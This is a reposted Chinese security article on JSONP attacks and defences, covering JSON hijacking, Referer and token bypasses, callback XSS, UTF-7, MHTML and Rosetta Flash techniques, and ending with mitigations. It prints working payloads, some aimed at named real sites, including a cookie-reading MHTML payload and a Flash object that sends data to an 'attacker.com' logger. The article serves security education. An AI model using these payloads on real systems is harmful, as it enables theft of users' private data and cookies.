JSONP 安全攻防技术
2015-03-02
转载出处：http://blog.knownsec.com/2015/03/jsonp_security_technic/
文/周景平 ( Superhei )    [ 知道创宇首席安全官 ( CSO ) ]    2014 . 07 . 12
注：本文首发于《程序员》 2014 . 08 期


关于 JSONP
JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <script></script> 元素标签，远程调用 JSON 文件来实现数据传递。如要在 a.com 域下获取存在 b.com 的 JSON 数据( getUsers.JSON ):
{"id" : "1","name" : "知道创宇"}
那么他们可以首先通过 JSONP 的“ Padding ”这个 getUsers.JSON 输出为：
callback({"id" : "1","name" : "知道创宇"});
对于实际应用过程中 callback 的名称在后台实现是动态输出的。如上面例子在 PHP 实现：
<?php
//getUsers.php
$callback = $_GET['callback'];
print $callback.'({"id" : "1","name" : "知道创宇"});';
?>
然后在 a.com 使用 <script> 进行远程调用,在 Jquery 里可以直接这样调用：
<script type="text/javascript" src="http://mini.jiasule.com/framework/jquery/1.9.1/jquery-1.9.1.js"></script>
<script type="text/javascript">
    $.getJSON("http://www.b.com/getUsers.php?callback=?", function(getUsers){
          alert(getUsers.name);
    });
</script>
然而，安全问题一直都是伴随着业务发展而出现的，JSONP 的出现同样带来了各种各样的安全问题。本文对 JSONP 实现过程中给带来的安全攻防问题做了一些简单介绍。

一、JSON 劫持
JSON 劫持又为“ JSON Hijacking ”，最开始提出这个概念大概是在 2008 年国外有安全研究人员提到这个 JSONP 带来的风险。其实这个问题属于 CSRF（ Cross-site request forgery 跨站请求伪造）攻击范畴。当某网站听过 JSONP 的方式来快域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的 JSONP 调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。一个典型的 JSON Hijacking 攻击代码：
<script>
function wooyun(v){
    alert(v.username);
}
</script>
<script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script>
这个是在乌云网上报告的一个攻击例子（ WooYun-2012-11284 ）http://www.wooyun.org/bug.php?action=view&id=11284 当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持。
虽然这种攻击已经出现了好几年了，但是目前在大的门户网站都还普遍存在的，而且由于安全意识问题很多官方可能还不认为这是一个安全问题，上面提到的例子其实当时在乌云网站上 360 是忽视了的！
当然还是随着安全意识和技术水平的提高，很多甲方公司开始重视此类安全问题，开始着手研究解决方案。其中一个方案就是验证 JSON 文件调用的来源（ Referer ）。这个方案是主要利用了 <script> 远程加载 JSON 文件时会发送 Referer ，在网站输出 JSON 数据时判断 Referer 是不是白名单合法的就可以进行防御！这个方法是可行的，但是具体实现过程中又容易导致 2 总常见的逻辑问题：
1、Referer 过滤（正则）不严谨
比如 http://www.qq.com/login.php?calback=cb 输出数据时,使用了 Referer 过滤。但是可惜过滤的时候只过滤了 Referer 里是否存在 qq.com 这样的关键词，那么攻击者可以听过构造 URL：http://www.qq.com.attack.com/attack.htm  或者 http://www.attack.com/attack.htm?qq.com 这样的页面来发起攻击实现绕过 Referer 防御。
2、空 Referer
在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！ 跨协议调用的一个简单例子：
<iframe src="javascript:'<script>function JSON(o){alert(o.userinfo.userid);}</script><script src=http://www.qq.com/login.php?calback=JSON></script>'"></iframe>
代码里我们使用 <iframe> 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。
另外一种防御手段就是通过随机 token 来防御，这个技术在 qq 的网站上应用比较多，如：http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=[QQ号码]&g_tk=[随机token] 来输出 JSON ，同样这个方案也是效的，但是同样可以出现防御实现的不严谨问题。如这个 token 可以暴力。如：
function _Callback(o){
    alert(o.items[0].uin);
}
for(i=17008;i<17009;i++){  //暴力循环调用
    getJSON("http://r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?uin=1111111&g_tk="+i);
}
当然以上的方式是单纯的针对“ JSON 劫持”本身的来展开的各种攻防战。但是在现实里，很多漏洞是配合组合来实现突破的，比如上面提到的限制 Referer+ 部署随机 token 实现都很完美，无懈可击！但是只要在该网站上出现一个 XSS 漏洞，那么利用这个 XSS 漏洞可能让你的防御体系瞬间崩溃！ 另外这里顺带提一点：以上的方法是一些通用实现“ JSON 劫持”的方法，但是现实中某些浏览器的一些特有的处理机制（如 CSS 加载，错误信息显示等），导致一些类似“ JSON 劫持”（攻击对象不一定是 JSON ）的攻击！

二、Callback 可定义导致的安全问题
在本文开头介绍 JSON 原理的就说明了可能是为了方便前段开发调用，一般输出时都是可定义的，开头提到的 php 实现的代码：
<?php
//getUsers.php
$callback = $_GET['callback'];
print $callback.'({"id" : "1","name" : "知道创宇"});';
?>
也就是这个可定义化的 callback 名输出点又导致了各种安全问题，当然严格上来说里面提到的具体数据输出也是可以利用的，只是本文重点强调的 callback 这个输出点。
1、Content-Type 与 XSS 漏洞
在早期 JSON 出现时候，大家都没有合格的编码习惯。再输出 JSON 时，没有严格定义好 Content-Type（ Content-Type: application/json ）然后加上 callback 这个输出点没有进行过滤直接导致了一个典型的 XSS 漏洞，上面演示的 getUsers.php 就存在这个问题：
http://127.0.0.1/getUsers.php?callback=<script>alert(/xss/)</script>
对于 Content-Type 来说早期还有一部分人比较喜欢使用 application / javascript  而这个头在 IE 等浏览器下一样可以解析 HTML 导致 XSS 漏洞。对于这种类型的漏洞，防御主要是从两个点去部署的：
a、严格定义 Content-Type: application / json
这样的防御机制导致了浏览器不解析恶意插入的 XSS 代码（直接访问提示文件下载）。但是凡事都有个案，在 IE 的进化过程中就出现过通过一些技巧绕过 Content-Type 防御解析 html ，比如在 IE6、7 等版本时请求的 URL 文件后面加一个 /x.html 就可以解析 html （ http://127.0.0.1/getUsers.php/x.html?callback=<script>alert(/xss/)</script>  ） 具体参考：http://hi.baidu.com/hi_heige/item/f1ecde01c4af3ed61ef04646
b、过滤 callback 以及 JSON 数据输出
这样的防御机制是比较传统的攻防思维，对输出点进行 xss 过滤。又是一个看上去很完美的解决方案，但是往往都是“事与愿违”。当年( 2011 年)一个 utf7-BOM 就复活了 n 个 XSS 漏洞。这种攻击方式主要还是存在与 IE 里(注在 IE 较新版本里已经“修复”) 也就是当我们在 callback 点输出 +/v8 这样的 utf7-BOM 的时候， IE 浏览器会把当前执行的编码认为是 utf7 ,所以我们通过 utf7 提交的 XSS 代码会被自动解码并执行。如：
http://127.0.0.1/getUsers.php?callback=%2B%2Fv8%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA
8AHMAYwByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApA
DsAPAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHk
APgA8AC8AaAB0AG0APg-%20
其中：
%2B%2Fv8
%20%2BADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAY
wByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADsAPAAv
AHMAYwByAGkAcAB0AD4APAAvAGIAbwBkAHkAPgA8AC8
AaAB0AG0APg-%20
URLdecode 为：
+/v8
+ADwAaAB0AG0APgA8AGIAbwBkAHkAPgA8AHMAY
wByAGkAcAB0AD4AYQBsAGUAcgB0ACgAMQApADs
APAAvAHMAYwByAGkAcAB0AD4APAAvAGIAbwBkA
HkAPgA8AC8AaAB0AG0APg-

其中 +/v8  为 utf7-BOM ，后面的为我们注入的 utf-7 编码后的 XSS 代码的：
<htm><body><script>alert(1);</script></body></htm>
[参考：http://hi.baidu.com/hi_heige/item/357831ab6932239a14107346]
这次利用 utf7-BOM 的方法是一个非常有代表性的通用方法，IE 后面的升级也是做一定的防御，另外在开发者角度也给出了防御方法直接强制指定 Content-Type里的编码 ( Content-Type: application/json; charset=utf-8 )  对于现在的浏览器上，虽然没有比较通用的技巧，但是对于开发者本事过滤的机制一样可能存在各种绕过的可能。
看来上面提到的 a 和 b 两点的防御缺一都可能出问题，那么我们使用“ a + b 方案”，也就是两者都上是不是很安全了不会出现问题了呢？一切皆有可能，我们拭目以待！

三、其他文件格式（ Content-Type ）与 JSON
1、MHTML 与 JSONP
在 2011 年 IE 曾经出现过一个听过 mhtml 协议解析跨域的漏洞：MHTML  Mime-Formatted Request Vulnerability  ( CVE-2011-0096 )  https://technet.microsoft.com/library/security/ms11-026 而当时的一个常见利用就是利用 JSONP 调用机制里的 Callback 函数名输出点：
<iframe src="mhtml:http://127.0.0.1/getUsers.php?callback=Content-Type%3A%20multipart%2Frelated%3B%20boundary%3D_boundary_by_mere%0D%0A%0D%0A--_boundary_by_mere%0D%0AContent-Location%3Acookie%0D%0AContent-Transfer-
Encoding%3Abase64%0D%0A%0D%0APGJvZHk%2BDQo8aWZyYW1lIGlkPWlmciBzcmM9Imh0dHA6Ly93d3cuODB2d
WwuY29tLyI%2BPC9pZnJhbWU%2BDQo8c2NyaXB0Pg0KYWxlcnQoZG9jdW1lbnQuY29va2ll
KTsNCmZ1bmN0aW9uIGNyb3NzY
29va2llKCl7DQppZnIgPSBpZnIuY29udGVudFdpbmRvdyA%2FIGlmci5jb250ZW50V2luZG93I
DogaWZyLmNvbnRlbnREb2N1bWVudDsNCmFsZXJ0KGlmci5
kb2N1bWVudC5jb29raWUpDQp9DQpzZXRUaW1lb3V0KCJjc
m9zc2Nvb2tpZSgpIiwxMDAwKTsNC
jwvc2NyaXB0PjwvYm9keT4NCg%3D%3D%0D%0A--_boundary_by_mere--%0D%0A!cookie"></iframe>

[详见： 《Hacking with mhtml protocol handler》http://www.80vul.com/mhtml/Hacking%20with%20mhtml%20protocol%20handler.txt]
这个点就充分利用了 callback 输出点直接输出一个 mhtml 文件格式，然后利用 <iframe> 调用 mhtml 标签解析并执行 html 及 javascript 代码，这也就是一个通用性的 XSS 漏洞（ UXSS ），随后微软紧急推出了解决方案及漏洞补丁程序！而对于开发者防御而已在微软推出安全补丁之前这个漏洞影响 Google 等国际大型网站，到时 Google 为了防御这类补丁，启用的防御措施是，在 JSON 输出 callback 时，在文件开头增加了多个换行回车让远程 mhtml 调用时解析失败。
在攻击角度来说，这个充分利用了计算机体系里各种文件格式识别机制，这个也和 Callback 直接在 json 文件开头输出的突然优势！在这个思维的引导下，后面还出现各种各样的文件格式加载带来的安全问题，比如 CSS 文件格式加载导致的类“ JSON 劫持”的安全问题、JS 加载及各种文件格式编码带来的安全问题等等。历史进程里往往会出现各种惊人的相识，JSONP 与文件格式的各种传奇还在上演...
2、FLASH 与 JSONP
该来的始终会来，只是没想到相似的场景上演到这么快!就在最近的一次 flash 安全更新 ( security bulletin APSB14-17[http://helpx.adobe.com/security/products/flash-player/apsb14-17.html] ) 里修复了一个安全漏洞：
These updates include additional validation checks to ensure that Flash Player rejects malicious content from vulnerable JSONP callback APIs ( CVE-2014-4671 ).
而这个漏洞因影响到 Google、Facebook、Tumblr 等国际大网站而倍受国内外媒体的关注。而这个攻击技术就和 JSONP 的 callback 点息息相关. 这个问题主要存在 HTML 通过<embed>、<object>调用远程 flash 文件时，会直接忽视 Content-Type 而 JSONP 的 callback 输出一般都在文件开头就输出，那么完全可以通过 callback 点输出一个 swf 的文件，然远程 html 调用并运行 swf 文件。如：
<script>
// from http://50.56.33.56/blog/?p=242
var flashvars = {};
var params = {};
var attributes = {};
var url="http://127.0.0.1/getUsers.php?callback=CWS%07%AA%01%00%00x%DADP%C1N%021%14%9C%ED%22-j0%21%24%EB%81%03z%E3%E2%1F%18XI%88%1E%607%C0%C1%8B%D9%ACP%91X%ECf%A9%01%BF%40N%1C%F7%E6%DD%CF%F1%8F%F0%B5K%E2%3BL%DFL%DA%E9%9B%B7%05%FF%05%82%0Chz%E8%B3%03U%AD%0A%AA%D8%23%E8%D6%9B%84%D4%C5I%12%A7%B3%B7t%21%D77%D3%0F%A3q%A8_%DA%0B%F1%EE%09gpJ%B2P%FA9U0%2FHr%AD%0Df%B9L%8D%9C%CA%AD%19%2C%A5%9A%C3P%87%7B%A9%94not%AE%E6%ED%2Bd%B96%DA%7Cf%12%ABt%F9%8E4%CB%10N%26%D2%C4%B9%CE%06%2A%5D%ACQ0%08%B4%1A%8Do%86%1FG%BC%96%93%F6%C2%0E%C9%3A%08Q%5C%83%3F2%80%B7%7D%02%2B%FF%83%60%DC%A6%11%BE%7BU%19%07%F6%28%09%1B%15%15%88%13Q%8D%BE%28ID%84%28%1F%11%F1%82%92%88%FD%B9%0D%EFw%C0V34%8F%B3%145%88Zi%8E%5E%14%15%17%E0v%13%AC%E2q%DF%8A%A7%B7%01%BA%FE%1D%B5%BB%16%B9%0C%A7%E1%A4%9F%0C%C3%87%11%CC%EBr%5D%EE%CA%A5uv%F6%EF%E0%98%8B%97N%82%B9%F9%FCq%80%1E%D1%3F%00%00%00%FF%FF%03%00%84%26N%A8";
swfobject.embedSWF(url, "content", "400", "200", "10.0.0", "expressInstall.swf", flashvars, params, attributes);
</script>
这样早在 2012 年提出的通过 callback 输出的 swf 文件流，的实际效果是在被攻击的网站上存放了一个恶意的 swf 文件，而 html 远程调用这个 swf 文件可以直接导致 CSRF 攻击.
[具体上传 flash 文件带来的 CSRF 攻击请参考我写的《 Flash+Upload Csrf  攻击技术》 http://blog.knownsec.com/2014/06/flashupload_csrf_attacking/]
细心的朋友可能发现上面代码里 callback 输出的 swf 文件流里存着各种各样的特殊字符，这个对于上面提到的“ b、过滤 callback 以及 JSON 数据输出”防御方案直接给拦截了，对于 Goolge 、Facebook 这样久经考验的大网站来说，防御应该不在话下！
在 flash 的更新“ security bulletin APSB14-17 ”发布后，该漏洞发现者给出了详细的漏洞细节其中一个亮点就是作者实现了一个纯 alphanumeric 输出的 swf 文件的方法，如：
<object type="application/x-shockwave-flash"
data="https://vulnerable.com/endpoint?callback=CWSMIKI0hCD0Up0IZ
UnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7iiudIbEAt333swW0ssG03sDDtDDDt0
333333Gt333swwv3wwwFPOHtoHHvwHHFhH3D0Up0IZUnnnnnnnnnnnnnnnnnnnUU
5nnnnnn3Snn7YNqdIbeUUUfV13333333333333333s03sDTVqefXAxooooD0Ciud
IbEAt33swwEpt0GDG0GtDDDtwwGGGGGsGDt33333www033333GfBDTHHHHUhHHHe
RjHHHhHHUccUSsgSkKoE5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7YN
qdIbe13333333333sUUe133333Wf03sDTVqefXA8oT50CiudIbEAtwEpDDG033sD
DGtwGDtwwDwttDDDGwtwG33wwGt0w33333sG03sDDdFPhHHHbWqHxHjHZNAqFzAH
ZYqqEHeYAHlqzfJzYyHqQdzEzHVMvnAEYzEVHMHbBRrHyVQfDQflqzfHLTrHAqzf
HIYqEqEmIVHaznQHzIIHDRRVEbYqItAzNyH7D0Up0IZUnnnnnnnnnnnnnnnnnnnU
U5nnnnnn3Snn7CiudIbEAt33swwEDt0GGDDDGptDtwwG0GGptDDww0GDtDDDGGDD
GDDtDD33333s03GdFPXHLHAZZOXHrhwXHLhAwXHLHgBHHhHDEHXsSHoHwXHLXAwX
HLxMZOXHWHwtHtHHHHLDUGhHxvwDHDxLdgbHHhHDEHXkKSHuHwXHLXAwXHLTMZOX
HeHwtHtHHHHLDUGhHxvwTHDxLtDXmwTHLLDxLXAwXHLTMwlHtxHHHDxLlCvm7D0U
p0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtuwt3sG33ww0sDtDt0
333GDw0w33333www033GdFPDHTLxXThnohHTXgotHdXHHHxXTlWf7D0Up0IZUnnn
nnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAtwwWtD333wwG03www0GDGpt03w
DDDGDDD33333s033GdFPhHHkoDHDHTLKwhHhzoDHDHTlOLHHhHxeHXWgHZHoXHTH
No4D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3Snn7CiudIbEAt33wwE03GDDG
wGGDDGDwGtwDtwDDGGDDtGDwwGw0GDDw0w33333www033GdFPHLRDXthHHHLHqee
orHthHHHXDhtxHHHLravHQxQHHHOnHDHyMIuiCyIYEHWSsgHmHKcskHoXHLHwhHH
voXHLhAotHthHHHLXAoXHLxUvH1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3
SnnwWNqdIbe133333333333333333WfF03sTeqefXA888ooooooooooooooooooo
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo8
88888880Nj0h"
style="display: none">
<param name="FlashVars"
value="url=https://vulnerable.com/account/sensitive_content_logged_in
&exfiltrate=http://attacker.com/log.php">
</object>
具体请参考：http://miki.it/blog/2014/7/8/abusing-jsonp-with-rosetta-flash/
所以对于纯 alphanumeric 的输出来说，那些针对 XSS 的过滤显然是可以直接忽略，这个漏洞也就是证明了上面我们提到的“ a + b 方案”直接绕过了！
三、防御
通过上面的攻防对抗演练，很多开发者可能会感觉有点悲剧的味道，各种防御机制好像都有办法绕过。这里我想到一个真理：没有绝对的安全！那么我们防御的意义在哪里呢？我认为防御的意义就是虽然没办法让开发的程序最安全（绝对安全），但是可以让它更安全！提高攻击者的技术成本的门槛是安全防御的一个主要的重要的方向。我们回到具体的 JSONP 防御上可以总结如下几点：
1、严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。
2、严格安装 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。
3、严格过滤 callback 函数名及 JSON 里数据的输出。
4、严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。
5、其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。
另：行文仓促，如有错误欢迎指正！( Email:5up3rh3i@gmail.com )
